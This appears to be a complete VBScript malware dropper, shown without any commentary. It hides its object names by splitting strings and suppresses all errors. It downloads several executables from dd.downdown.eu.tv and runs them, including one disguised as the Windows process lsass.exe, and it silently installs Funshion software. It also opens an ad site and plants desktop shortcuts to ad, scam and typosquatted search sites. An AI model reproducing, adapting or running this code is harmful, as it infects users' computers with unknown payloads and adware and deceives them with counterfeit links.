On Error Resume Next
downname1=StrReverse(Mid(StrReverse(wscript.ScriptName),5))
Set goto10 = WScript.CreateObject("WScript.Shell")
SYSTEMROOT=goto10.Environment("process")("APPDATA")
set wsssr3=createobject("wsc"&"ri"&"pt.sh"&"ell")
strDesktop = wsssr3.SpecialFolders("Desktop")
strWinDir=wsssr3.ExpandEnvironmentStrings("%te"&"mp%")
Set xfuck = CreateObject("Mi"&"crosoft.XMLHT"&"T"&"P")
top=wsssr3.SpecialFolders("desktop")
set ws11=createobject("wscript.shell")
wsssr3.Run "http://www.700yy.com/"
with xfuck
.Open "GET","http://dd.downdown.eu.tv/down/pptv.exe",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\"&downname1&".exe",eval ("2")
end with
ws11.run ""&strWinDir&"\"&downname1&".exe"
with xfuck
.Open "GET","http://dd.downdown.eu.tv/down/lsass.exe",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&systemroot&"\lsass.exe",eval ("2")
end with
ws11.run """"&systemroot&"\lsass.exe"""
with xfuck
.Open "GET","http://dd.downdown.eu.tv/down/a4.exe",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\a4.exe",eval ("2")
end with
ws11.run ""&strWinDir&"\a4.exe"
'--------------------- if Instr(downname1,"网址更新器")>0 Then
with xfuck
.Open "GET","http://dd.downdown.eu.tv/down/dz.exe",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\dz.exe",eval ("2")
end with
ws11.run ""&strWinDir&"\dz.exe"
'--------------------- end if
with xfuck 
.Open "GET","http://neirong.funshion.com/software/download.php?id=43423",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y")
.SaveToFile ""&strWinDir&"\FunshionInstall_C43423.exe",eval ("2")
end with
ws11.run ""&strWinDir&"\FunshionInstall_C43423.exe /S"

Set objURLShortcut = wsssr3.CreateShortcut(strDesktop&"\免费电影.url")
objURLShortcut.TargetPath = "http://www.700yy.com"
objURLShortcut.Save
Set objURLShortcut = wsssr3.CreateShortcut(strDesktop&"\发财项目.url")
objURLShortcut.TargetPath = "http://www.23492.com"
objURLShortcut.Save
Set objURLShortcut = wsssr3.CreateShortcut(strDesktop&"\淘宝网.url")
objURLShortcut.TargetPath = "http://www.0344.net/taobao/"
objURLShortcut.Save
Set objURLShortcut = wsssr3.CreateShortcut(strDesktop&"\百度搜索.url")
objURLShortcut.TargetPath = "http://www.googje.in/baidu/"
objURLShortcut.Save

WScript.Sleep 30000
Const PROGRAM_FILES1 = &H26&
Set objShell = CreateObject("Shell.Application")
Set objFolder = objShell.Namespace(PROGRAM_FILES1)
Set objFolderItem1 = objFolder.Self
ws11.run """"&objFolderItem1.Path&"\Funshion Online\Funshion\Funshion.exe"""